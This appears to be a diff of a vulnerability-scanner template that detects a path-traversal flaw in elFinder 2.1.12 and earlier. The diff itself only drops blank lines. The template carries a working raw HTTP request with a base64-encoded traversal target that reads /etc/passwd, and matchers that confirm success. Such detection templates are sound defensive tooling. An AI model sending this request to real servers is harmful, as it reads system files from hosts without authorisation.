@@ -1,5 +1,4 @@
 id: elFinder-path-traversal
-
 info:
   name: elFinder  <=2.1.12 - Local File Inclusion
   author: ritikchaddha
@@ -16,20 +15,17 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: lfi,elfinder
-
 requests:
   - raw:
       - |
         GET /php/connector.minimal.php?cmd=file&target=l1_Li8vLi4vLy4uLy8uLi8vLi4vLy4uLy8uLi9ldGMvcGFzc3dk&download=1 HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
-
     matchers-condition: and
     matchers:
       - type: regex
         regex:
           - "root:.*:0:0:"
-
       - type: status
         status:
           - 200
